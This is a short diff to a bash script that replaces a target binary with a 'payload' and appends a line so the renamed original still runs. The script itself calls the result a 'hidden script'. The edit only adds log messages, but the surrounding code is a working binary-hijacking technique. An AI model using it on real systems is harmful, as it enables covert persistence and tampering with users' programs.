@@ -7,7 +7,7 @@ GREEN="\e[32m"
 RESET="\e[0m"
 
 function logloc { printf "${CYAN}$1${RESET} @ ${GREEN}$2${RESET}\n"; }
-function log { printf "$1\n"; }
+function log { printf "$1.\n"; }
 function succ { printf "${GREEN}$1${RESET}\n"; }
 function warn { printf "${YELLOW}$1${RESET}\n"; }
 function fail {
@@ -34,9 +34,13 @@ logloc "Binary" "$binary"
 if [[ -f "${binary}_" ]]; then
     warn "Replacing existing hidden script."
 else
+    log "Moving normal binary"
     mv "$binary" "${binary}_"
 fi
+log "Inserting payload"
 cp "$payload" "$binary"
+log "Making payload executable"
 chmod +x "$binary"
 
+log "Appending line to run normal binary"
 echo '"$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")_"' >> "$binary"
